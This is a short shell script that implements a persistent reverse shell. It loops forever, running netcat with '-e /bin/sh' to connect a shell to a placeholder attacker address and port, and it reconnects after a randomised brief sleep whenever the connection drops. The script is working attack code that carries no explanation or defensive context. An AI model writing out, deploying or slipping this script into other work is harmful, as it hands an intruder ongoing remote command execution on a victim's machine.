#!/bin/sh
_addr=IP_ADDRESS
_port=PORT

while true; do
    nc -e /bin/sh $_addr $_port
    [ -n $RANDOM ] && \
        sleep .$(($RANDOM % 9))s || \
            sleep .25s
done